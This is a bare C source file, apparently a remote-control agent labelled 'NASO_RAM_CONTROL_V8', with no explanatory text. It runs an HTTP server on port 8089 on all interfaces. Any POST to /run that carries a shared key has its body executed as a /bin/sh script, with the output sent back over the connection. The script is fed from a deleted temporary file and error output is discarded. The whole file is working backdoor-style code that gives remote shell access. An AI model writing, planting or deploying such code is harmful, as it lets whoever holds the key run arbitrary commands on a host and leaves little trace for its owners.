#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/time.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#ifndef CONTROL_KEY
#error CONTROL_KEY required
#endif
static int sendall(int fd,const char *p,size_t n){while(n){ssize_t k=send(fd,p,n,MSG_NOSIGNAL);if(k<=0)return -1;p+=k;n-=k;}return 0;}
static void response(int c,const char *status,const char *body){char h[200];int n=snprintf(h,sizeof(h),"HTTP/1.0 %s\r\nContent-Type: text/plain\r\nContent-Length: %zu\r\nConnection: close\r\n\r\n",status,strlen(body));if(!sendall(c,h,n))sendall(c,body,strlen(body));}
static void client(int c){
 char h[4096];size_t used=0;char *end=NULL;
 while(used<sizeof(h)-1){ssize_t n=recv(c,h+used,sizeof(h)-1-used,0);if(n<=0)return;used+=n;h[used]=0;end=strstr(h,"\r\n\r\n");if(end)break;}
 if(!end){response(c,"400 Bad Request","Header too long\n");return;}
 if(!strncmp(h,"GET / HTTP/",11)){response(c,"200 OK","NASO_RAM_CONTROL_V8\n");return;}
 if(strncmp(h,"POST /run HTTP/",15)){response(c,"404 Not Found","Unknown path\n");return;}
 if(!strstr(h,"\r\nX-Naso-Key: " CONTROL_KEY "\r\n")){response(c,"403 Forbidden","Key required\n");return;}
 char *p=strstr(h,"\r\nContent-Length: ");if(!p){response(c,"411 Length Required","Length required\n");return;}
 char *after=NULL;errno=0;unsigned long len=strtoul(p+18,&after,10);
 if(errno||after==p+18||*after!='\r'||!len||len>65536){response(c,"400 Bad Request","Bad body size\n");return;}
 char path[]="/tmp/naso-control-XXXXXX";int fd=mkstemp(path);
 if(fd<0){response(c,"500 Error","RAM file failed\n");return;}
 unlink(path);size_t got=used-(size_t)(end+4-h);if(got>len)got=len;
 if(got&&write(fd,end+4,got)!=(ssize_t)got){close(fd);return;}
 char buf[4096];
 while(got<len){size_t want=len-got;if(want>sizeof(buf))want=sizeof(buf);ssize_t n=recv(c,buf,want,0);if(n<=0||write(fd,buf,n)!=n){close(fd);return;}got+=n;}
 if(lseek(fd,0,SEEK_SET)<0){close(fd);return;}
 const char *header="HTTP/1.0 200 OK\r\nContent-Type: application/octet-stream\r\nConnection: close\r\n\r\n";
 if(sendall(c,header,strlen(header))){close(fd);return;}
 dup2(fd,STDIN_FILENO);close(fd);dup2(c,STDOUT_FILENO);
 int nullfd=open("/dev/null",O_WRONLY);if(nullfd>=0){dup2(nullfd,STDERR_FILENO);close(nullfd);}
 close(c);execl("/bin/sh","sh",(char*)NULL);
}
int main(void){
 signal(SIGCHLD,SIG_IGN);int s=socket(AF_INET,SOCK_STREAM|SOCK_CLOEXEC,0),on=1;if(s<0)return 1;
 setsockopt(s,SOL_SOCKET,SO_REUSEADDR,&on,sizeof(on));
 struct sockaddr_in a={.sin_family=AF_INET,.sin_port=htons(8089),.sin_addr.s_addr=INADDR_ANY};
 if(bind(s,(void*)&a,sizeof(a))||listen(s,4))return 2;
 for(;;){int c=accept4(s,NULL,NULL,SOCK_CLOEXEC);if(c<0)continue;pid_t p=fork();if(p==0){close(s);struct timeval t={30,0};setsockopt(c,SOL_SOCKET,SO_RCVTIMEO,&t,sizeof(t));setsockopt(c,SOL_SOCKET,SO_SNDTIMEO,&t,sizeof(t));client(c);close(c);_exit(0);}close(c);}
}

